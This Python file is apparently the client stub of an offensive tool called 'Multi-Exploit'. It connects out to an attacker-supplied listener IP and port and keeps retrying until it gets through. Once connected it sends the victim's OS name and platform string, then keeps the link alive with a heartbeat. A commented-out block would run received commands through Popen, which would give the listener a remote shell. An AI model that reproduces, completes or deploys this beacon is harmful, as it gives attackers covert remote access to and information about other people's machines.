#    Multi-Exploit  Copyright (C) 2024  Adam Perkowski

import socket
from subprocess import Popen
from sys import argv
from os import name as osname
from platform import platform as ospltfrm
from time import sleep

def conn():
    print('connecting...')
    g = False
    while not g:
        try:
            sockObject.connect((listenerIP, port))
            g = True
        except:
            g = False
    print('\nconnected >:)\nping: ')
    print('sending os info...\n')
    sockObject.send(osname.encode())
    sleep(2)
    sockObject.send(ospltfrm().encode())
    sleep(2)

argv.pop(0)
print(argv)

sockObject = socket.socket()

if len(argv) < 2:
    listenerIP = input("IP  ? ")
    port = int(input("TCP ? "))
else:
    listenerIP = argv[0]
    port = int(argv[1])

conn()

while True:
    try:
        sockObject.send("pong".encode())
        sleep(5)
    except:
        print("\nconnection lost.\nresetting...\n")
        sockObject = socket.socket()
        conn()

    #r = sockObject.recv(1024).decode()
    #if('sh' in r): Popen(r.replace('sh', ''))
    #elif('ft' in r): print('ftp')
